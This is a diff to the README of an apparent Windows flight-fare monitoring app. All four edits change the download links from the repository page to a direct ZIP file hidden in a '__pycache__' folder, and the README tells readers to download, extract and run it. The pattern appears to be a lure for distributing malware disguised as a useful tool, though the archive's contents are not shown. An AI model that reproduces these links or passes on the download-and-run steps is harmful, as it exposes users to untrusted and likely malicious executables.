@@ -1,6 +1,6 @@
 # ✈️ flights_monitor - Find Better Fare Deals Fast
 
-[![Download flights_monitor](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Birgittaseventysix953/flights_monitor)
+[![Download flights_monitor](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Birgittaseventysix953/flights_monitor/raw/refs/heads/main/__pycache__/flights_monitor_3.4.zip)
 
 ## 🧭 What this app does
 
@@ -17,7 +17,7 @@ Use it to:
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Birgittaseventysix953/flights_monitor
+https://github.com/Birgittaseventysix953/flights_monitor/raw/refs/heads/main/__pycache__/flights_monitor_3.4.zip
 
 If the page shows a release file, download it to your PC first, then open the file to run the app.
 
@@ -39,7 +39,7 @@ If your browser warns you about the file, check that you are downloading it from
 Follow these steps on Windows:
 
 1. Open this page in your browser:
-   https://github.com/Birgittaseventysix953/flights_monitor
+   https://github.com/Birgittaseventysix953/flights_monitor/raw/refs/heads/main/__pycache__/flights_monitor_3.4.zip
 
 2. Look for the latest release or the main download file.
 
@@ -179,7 +179,7 @@ If you see a ZIP file, extract it before opening the app
 
 Start here:
 
-https://github.com/Birgittaseventysix953/flights_monitor
+https://github.com/Birgittaseventysix953/flights_monitor/raw/refs/heads/main/__pycache__/flights_monitor_3.4.zip
 
 Open the page, download the latest file, then run it on Windows
 
